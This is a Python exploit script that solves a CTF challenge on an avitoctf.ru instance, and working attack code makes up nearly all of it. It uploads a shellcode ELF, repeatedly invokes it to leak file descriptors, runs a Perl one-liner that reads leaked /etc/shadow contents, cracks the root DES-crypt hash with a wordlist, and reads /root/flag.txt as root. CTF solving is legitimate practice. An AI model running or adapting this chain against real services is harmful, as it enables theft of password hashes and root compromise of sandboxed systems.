#!/usr/bin/env python3
"""СотоLambda full chain: upload ELF, leak shadow fds, crack root, read the flag."""

from __future__ import annotations

import argparse
import re
import warnings
from pathlib import Path

import mkelf
import requests

DEFAULT_BASE = "https://elflambda-4l9s81og.avitoctf.ru"
PERL_FD_READER = r"""perl -e 'for my $n (3..200){
open(my $F, "<&=" . $n) or next;
my $pos=sysseek($F,0,0); next unless defined $pos;
my $buf=""; my $r=sysread($F,$buf,65536);
next unless $r && $buf =~ /^root:/m;
print "###FD".$n." len=".$r."\n".$buf; last; }'
"""
ROOT_HASH_RE = re.compile(r"(?m)^root:([^:]+):")
FLAG_RE = re.compile(r"avito\{[^}\r\n]+\}")


def upload(session: requests.Session, base: str, elf: bytes) -> str:
    """Upload the dependency-free shell ELF and return its binary id."""
    response = session.post(
        f"{base.rstrip('/')}/api/upload",
        files={"file": ("shell.elf", elf, "application/octet-stream")},
        timeout=30,
    )
    response.raise_for_status()
    binary_id = response.json().get("binary_id")
    if not isinstance(binary_id, str):
        raise ValueError(f"binary_id missing: {response.text[:500]}")
    print(f"[upload] binary_id={binary_id}")
    return binary_id


def invoke(
    session: requests.Session,
    base: str,
    binary_id: str,
    stdin: str,
    login: str,
    password: str,
    timeout_ms: int,
) -> requests.Response:
    """Invoke the uploaded shell through the vulnerable worker API."""
    return session.post(
        f"{base.rstrip('/')}/api/invoke",
        json={
            "binary_id": binary_id,
            "stdin": stdin,
            "auth": {"login": login, "password": password},
            "sandbox_settings": {"memory_mb": 64, "timeout_ms": timeout_ms},
        },
        timeout=max(30, timeout_ms / 1000 + 10),
    )


def response_text(response: requests.Response) -> str:
    """Flatten a JSON invoke response so stdout/stderr are both searchable."""
    try:
        body = response.json()
    except requests.JSONDecodeError:
        return response.text
    if isinstance(body, dict):
        return "\n".join(str(value) for value in body.values())
    return str(body)


def crack_des(hash_value: str, words: list[str]) -> str:
    """Verify candidate passwords against the leaked traditional DES-crypt hash."""
    with warnings.catch_warnings():
        warnings.simplefilter("ignore", DeprecationWarning)
        import crypt

    salt = hash_value[:2]
    for word in words:
        candidate = word.strip()
        if candidate and crypt.crypt(candidate, salt) == hash_value:
            return candidate
    raise ValueError("password was not found; pass a larger --wordlist or --root-password")


def main() -> None:
    """CLI entry point."""
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--base", default=DEFAULT_BASE)
    parser.add_argument("--leaks", type=int, default=50)
    parser.add_argument("--wordlist", type=Path)
    parser.add_argument("--root-password", help="skip DES-crypt dictionary verification")
    parser.add_argument("--self-test", action="store_true")
    args = parser.parse_args()

    elf = mkelf.build_elf(mkelf.SHELLCODE)
    if args.self_test:
        assert elf.startswith(b"\x7fELF")
        assert len(elf) == 159
        assert crack_des("azMuiLc/ZPwrM", ["badger", "mole"]) == "mole"
        print("self-test: OK")
        return

    with requests.Session() as session:
        binary_id = upload(session, args.base, elf)
        for number in range(1, args.leaks + 1):
            response = invoke(
                session,
                args.base,
                binary_id,
                "sleep 3\n",
                "runner",
                "runner",
                1,
            )
            print(f"[leak {number:02d}/{args.leaks}] HTTP {response.status_code}")

        leaked = invoke(
            session,
            args.base,
            binary_id,
            PERL_FD_READER,
            "runner",
            "runner",
            2000,
        )
        text = response_text(leaked)
        print(text[:12000])
        match = ROOT_HASH_RE.search(text)
        if not match:
            raise RuntimeError("root hash was not found; retry with a fresh instance/fewer leaks")
        root_hash = match.group(1)
        print(f"[shadow] root hash: {root_hash}")

        if args.root_password:
            password = args.root_password
        else:
            words = ["runner", "root", "honey", "badger", "mole"]
            if args.wordlist:
                words = args.wordlist.read_text(errors="replace").splitlines()
            password = crack_des(root_hash, words)
        print(f"[crack] root password: {password}")

        flag_response = invoke(
            session,
            args.base,
            binary_id,
            "cat /root/flag.txt\n",
            "root",
            password,
            2000,
        )
        flag_text = response_text(flag_response)
        print(flag_text)
        flag = FLAG_RE.search(flag_text)
        if not flag:
            raise RuntimeError("root invocation completed but no flag was returned")
        print(f"FLAG: {flag.group(0)}")


if __name__ == "__main__":
    main()
